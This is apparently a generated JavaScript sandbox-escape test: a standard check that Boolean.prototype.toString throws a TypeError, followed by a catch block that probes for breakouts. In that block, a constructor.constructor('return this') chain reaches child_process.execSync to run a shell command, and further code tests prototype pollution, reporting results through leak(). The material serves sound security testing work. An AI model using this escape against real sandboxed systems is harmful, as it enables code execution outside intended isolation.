try {
    try {
        var s1 = new Number();
        s1.toString = Boolean.prototype.toString;
        var v1 = s1.toString();
        $ERROR('#1: Boolean.prototype.toString on not a Boolean object should throw TypeError');
    } catch (e) {
        if (!(e instanceof TypeError)) {
            $ERROR('#1: Boolean.prototype.toString on not a Boolean object should throw TypeError, not ' + e);
        }
    }
    try {
        var s2 = new Number();
        s2.myToString = Boolean.prototype.toString;
        var v2 = s2.myToString();
        $ERROR('#2: Boolean.prototype.toString on not a Boolean object should throw TypeError');
    } catch (e) {
        if (!(e instanceof TypeError)) {
            $ERROR('#2: Boolean.prototype.toString on not a Boolean object should throw TypeError, not ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}